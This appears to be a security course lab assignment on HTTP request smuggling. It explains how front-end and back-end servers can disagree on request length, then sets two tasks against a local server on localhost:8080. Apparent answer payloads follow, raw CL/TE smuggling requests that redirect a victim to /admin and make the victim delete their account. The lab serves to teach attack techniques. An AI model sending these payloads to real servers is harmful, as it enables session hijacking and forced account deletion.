# Task 2
Now knowing how we define how much of an HTTP request is read, you will craft attacks using HTTP request smuggling. By constructing requests that different components interpret differently, an attacker can desynchronise the request stream. This makes it possible to inject hidden requests into the back-end connection, which leads to cache poisoning, credential hijacking, bypass of access controls, or direct compromise of other users’ sessions.

Request smuggling is primarily associated with HTTP/1 requests. However, a website supporting HTTP/2 may be vulnerable, depending on their back-end architecture.

![smugglingimg](/lab/images/request-smuggling.png)
###### Image from portswigger.net showing an overview of the attack

## Task 2.1 Redirect victim to another page
The idea is to use HTTP request smuggling to redirect a victim to another page, making the user perform an action without their consent. In this scenario, shortly after you send your attack; a victim will send a `GET` request for `/public` to the same server. Knowing that the server is vulnerable to HTTP request smuggling, craft a raw HTTP request from the attacker to the front-end that exploits a Transfer-Encoding / Content-Length parsing mismatch so the victim gets redirected to `/admin`.

Write the attack in `attack1.txt`.

The victims `GET` request will look something like this:
```http
GET /public HTTP/1.1
Host: localhost:8080
Authorization: Basic YWRtaW46YWRtaW4xMjM=


```

POST / HTTP/1.1
Host: localhost:8080
Content-Length: 1
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
x-foo: x

## Task 2.2 Delete the victim account
The goal is to make the user unknowingly delete their account by redirecting them to the /DeleteAccount page. Craft a raw HTTP request from the attacker to the front-end that exploits a Transfer-Encoding / Content-Length parsing mismatch so the victim deletes his account by redirecting him to the `/deleteAccount` page. Similar to `Task 2.1` the victim will send a `GET` request.

Write the attack in `attack2.txt`.

POST / HTTP/1.1
Host: localhost:8080
Content-Length: 10
Transfer-Encoding: chunked

0

POST /deleteAccount HTTP/1.1
x-foo: x